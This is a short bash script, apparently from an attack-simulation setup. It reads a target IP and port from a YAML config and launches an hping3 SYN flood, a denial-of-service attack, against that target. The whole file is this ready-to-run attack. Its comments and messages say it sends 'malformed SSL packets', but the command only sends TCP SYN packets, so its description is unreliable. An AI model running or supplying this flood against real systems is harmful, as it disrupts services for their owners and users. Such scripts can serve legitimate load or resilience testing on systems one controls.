#!/bin/bash
# scripts/analysis.sh

CONFIG_FILE="/etc/attack-config.yml"

# Extract variables using yq
TARGET_IP=$(yq e '.analysis.target_ip' "$CONFIG_FILE")
TARGET_PORT=$(yq e '.analysis.target_port' "$CONFIG_FILE")

echo "Starting Analysis Attack: Sending malformed SSL packets to $TARGET_IP:$TARGET_PORT..."

# Send malformed SSL packets using hping3
hping3 -S -p "$TARGET_PORT" --flood "$TARGET_IP"

echo "Analysis Attack Completed."
